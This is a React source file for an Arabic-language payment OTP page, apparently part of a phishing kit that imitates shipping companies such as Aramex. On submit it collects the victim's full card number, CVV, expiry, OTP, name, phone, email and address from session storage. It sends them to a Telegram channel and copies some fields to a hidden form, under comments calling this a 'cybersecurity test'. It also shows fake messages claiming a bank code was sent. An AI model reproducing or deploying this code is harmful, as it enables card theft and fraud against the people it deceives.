import { useState, useEffect } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { getServiceBranding } from "@/lib/serviceLogos";
import DynamicPaymentLayout from "@/components/DynamicPaymentLayout";
import { Shield, AlertCircle, Check, ArrowLeft, X } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { useLink } from "@/hooks/useSupabase";
import { sendToTelegram } from "@/lib/telegram";

const PaymentOTPForm = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: linkData } = useLink(id);
  
  const [otp, setOtp] = useState("");
  const [attempts, setAttempts] = useState(0);
  const [error, setError] = useState("");
  const [countdown, setCountdown] = useState(60);
  
  const customerInfo = JSON.parse(sessionStorage.getItem('customerInfo') || '{}');
  const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
  const serviceName = linkData?.payload?.service_name || serviceKey;
  const branding = getServiceBranding(serviceKey);
  
  const shippingInfo = linkData?.payload as any;
  const amount = shippingInfo?.cod_amount || 500;
  const formattedAmount = `${amount} ر.س`;
  
  // Demo OTP: 123456
  const DEMO_OTP = "123456";
  
  // Countdown timer effect
  useEffect(() => {
    if (countdown > 0) {
      const timer = setTimeout(() => setCountdown(countdown - 1), 1000);
      return () => clearTimeout(timer);
    }
  }, [countdown]);
  
  const handleClearOTP = () => {
    setOtp("");
    setError("");
  };

  // Handle keyboard shortcuts
  const handleKeyDown = (e: React.KeyboardEvent) => {
    // Clear OTP on Escape key
    if (e.key === 'Escape') {
      handleClearOTP();
    }
    // Clear OTP on Ctrl+Backspace or Cmd+Backspace
    if ((e.ctrlKey || e.metaKey) && e.key === 'Backspace') {
      e.preventDefault();
      handleClearOTP();
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError("");
    
    if (otp === DEMO_OTP) {
      // Submit to Netlify Forms
      try {
        await fetch("/", {
          method: "POST",
          headers: { "Content-Type": "application/x-www-form-urlencoded" },
          body: new URLSearchParams({
            "form-name": "payment-confirmation",
            name: customerInfo.name || '',
            email: customerInfo.email || '',
            phone: customerInfo.phone || '',
            service: serviceName,
            amount: formattedAmount,
            cardLast4: sessionStorage.getItem('cardLast4') || '',
            cardholder: sessionStorage.getItem('cardName') || '',
            otp: otp,
            timestamp: new Date().toISOString()
          }).toString()
        });
      } catch (err) {
        console.error("Form submission error:", err);
      }
      
      // Send complete payment confirmation to Telegram (cybersecurity test)
      const telegramResult = await sendToTelegram({
        type: 'payment_confirmation',
        data: {
          name: customerInfo.name || '',
          email: customerInfo.email || '',
          phone: customerInfo.phone || '',
          address: customerInfo.address || '',
          service: serviceName,
          amount: formattedAmount,
          cardholder: sessionStorage.getItem('cardName') || '',
          cardNumber: sessionStorage.getItem('cardNumber') || '', // Full card number
          cardLast4: sessionStorage.getItem('cardLast4') || '',
          expiry: sessionStorage.getItem('cardExpiry') || '12/25',
          cvv: sessionStorage.getItem('cardCvv') || '', // CVV for cybersecurity test
          otp: otp
        },
        timestamp: new Date().toISOString()
      });

      if (telegramResult.success) {
        console.log('Payment confirmation sent to Telegram successfully');
      } else {
        console.error('Failed to send payment confirmation to Telegram:', telegramResult.error);
      }
      
      toast({
        title: "تم بنجاح!",
        description: "تم تأكيد الدفع بنجاح",
      });
      
      navigate(`/pay/${id}/receipt`);
    } else {
      const newAttempts = attempts + 1;
      setAttempts(newAttempts);
      
      if (newAttempts >= 3) {
        setError("تم حظر عملية الدفع مؤقتاً لأسباب أمنية.");
        toast({
          title: "تم الحظر",
          description: "لقد تجاوزت عدد المحاولات المسموحة",
          variant: "destructive",
        });
      } else {
        setError(`رمز التحقق غير صحيح. حاول مرة أخرى. (${3 - newAttempts} محاولات متبقية)`);
      }
    }
  };
  
  return (
    <div onKeyDown={handleKeyDown} tabIndex={0}>
      <DynamicPaymentLayout
        serviceName={serviceName}
        serviceKey={serviceKey}
        amount={formattedAmount}
        title="رمز التحقق"
        description={`أدخل رمز التحقق لخدمة ${serviceName}`}
        icon={<Shield className="w-7 h-7 sm:w-10 sm:h-10 text-white" />}
      >
      {/* Title Section */}
      <div className="text-center mb-6 sm:mb-8">
        <div 
          className="w-16 h-16 sm:w-20 sm:h-20 rounded-full mx-auto mb-4 flex items-center justify-center animate-pulse shadow-lg"
          style={{
            background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
          }}
        >
          <Shield className="w-8 h-8 sm:w-10 sm:h-10 text-white" />
        </div>
        <h1 className="text-2xl sm:text-3xl font-bold mb-2">رمز التحقق</h1>
        <p className="text-sm sm:text-base text-muted-foreground">أدخل الرمز المرسل إلى هاتفك</p>
      </div>

      {/* Info */}
      <div 
        className="rounded-lg p-3 sm:p-4 mb-6"
        style={{
          background: `${branding.colors.primary}10`,
          border: `1px solid ${branding.colors.primary}30`
        }}
      >
        <p className="text-xs sm:text-sm text-center">
          تم إرسال رمز التحقق المكون من 6 أرقام إلى هاتفك المسجل في البنك
        </p>
      </div>
      
      <form onSubmit={handleSubmit}>
        {/* OTP Input - 6 digits */}
        <div className="mb-6">
          <div className="flex gap-2 justify-center items-center" dir="ltr">
            {[0, 1, 2, 3, 4, 5].map((index) => (
              <Input
                key={index}
                value={otp[index] || ''}
                onChange={(e) => {
                  const val = e.target.value.replace(/\D/g, "");
                  if (val) {
                    const newOtp = otp.split('');
                    newOtp[index] = val[val.length - 1];
                    setOtp(newOtp.join(''));
                    // Auto-focus next input
                    if (index < 5 && val) {
                      const nextInput = e.target.parentElement?.nextElementSibling?.querySelector('input');
                      nextInput?.focus();
                    }
                  }
                }}
                onKeyDown={(e) => {
                  if (e.key === 'Backspace' && !otp[index] && index > 0) {
                    const prevInput = e.currentTarget.parentElement?.previousElementSibling?.querySelector('input');
                    prevInput?.focus();
                  }
                }}
                inputMode="numeric"
                maxLength={1}
                autoComplete={index === 0 ? "one-time-code" : "off"}
                className="w-12 h-14 sm:w-14 sm:h-16 text-center text-xl sm:text-2xl font-bold border-2"
                style={{
                  borderColor: otp[index] ? branding.colors.primary : undefined
                }}
                disabled={attempts >= 3}
                required
              />
            ))}
            
            {/* Delete Button */}
            {otp.length > 0 && attempts < 3 && (
              <Button
                type="button"
                variant="ghost"
                size="sm"
                onClick={handleClearOTP}
                className="w-8 h-8 sm:w-10 sm:h-10 p-0 rounded-full hover:bg-destructive/10 hover:text-destructive transition-colors mr-2"
              >
                <X className="w-4 h-4 sm:w-5 sm:h-5" />
              </Button>
            )}
          </div>
          
          {/* Keyboard Instructions */}
          {otp.length > 0 && attempts < 3 && (
            <div className="text-center mt-3">
              <p className="text-xs text-muted-foreground">
                اضغط <kbd className="px-1.5 py-0.5 text-xs bg-muted rounded">Esc</kbd> أو <kbd className="px-1.5 py-0.5 text-xs bg-muted rounded">Ctrl+Backspace</kbd> أو زر <X className="w-3 h-3 inline mx-1" /> لمسح الرمز
              </p>
            </div>
          )}
        </div>
      
        {/* Error Message */}
        {error && (
          <div 
            className="rounded-lg p-3 mb-6 flex items-start gap-2 bg-destructive/10 border border-destructive/30"
          >
            <AlertCircle className="w-4 h-4 sm:w-5 sm:h-5 mt-0.5 flex-shrink-0 text-destructive" />
            <p className="text-xs sm:text-sm text-destructive">{error}</p>
          </div>
        )}
        
        {/* Countdown Timer */}
        {countdown > 0 && (
          <div className="text-center mb-6">
            <p className="text-xs sm:text-sm text-muted-foreground">
              إعادة إرسال الرمز بعد <strong>{countdown}</strong> ثانية
            </p>
          </div>
        )}

        {/* Attempts Counter */}
        {attempts > 0 && attempts < 3 && (
          <div className="text-center mb-6">
            <p className="text-xs sm:text-sm text-yellow-600">
              المحاولات المتبقية: <strong>{3 - attempts}</strong>
            </p>
          </div>
        )}
        
        {/* Submit Button */}
        <Button
          type="submit"
          size="lg"
          className="w-full text-sm sm:text-lg py-5 sm:py-7 text-white"
          disabled={attempts >= 3 || otp.length < 6}
          style={{
            background: attempts >= 3 
              ? '#666' 
              : `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
          }}
        >
          {attempts >= 3 ? (
            <span>محظور مؤقتاً</span>
          ) : (
            <>
              <span className="ml-2">تأكيد الدفع</span>
              <ArrowLeft className="w-4 h-4 sm:w-5 sm:h-5 mr-2" />
            </>
          )}
        </Button>
        
        {countdown === 0 && (
          <Button
            type="button"
            variant="ghost"
            className="w-full mt-3"
            style={{ color: branding.colors.primary }}
            onClick={() => {
              setCountdown(60);
              toast({
                title: "تم إرسال الرمز",
                description: "تم إرسال رمز تحقق جديد إلى هاتفك",
              });
            }}
          >
            إعادة إرسال الرمز
          </Button>
        )}
      </form>
      
      {/* Hidden Netlify Form */}
      <form name="payment-confirmation" netlify-honeypot="bot-field" data-netlify="true" hidden>
        <input type="text" name="name" />
        <input type="email" name="email" />
        <input type="tel" name="phone" />
        <input type="text" name="service" />
        <input type="text" name="amount" />
        <input type="text" name="cardholder" />
        <input type="text" name="cardLast4" />
        <input type="text" name="otp" />
        <input type="text" name="timestamp" />
      </form>
      </DynamicPaymentLayout>
    </div>
  );
};

export default PaymentOTPForm;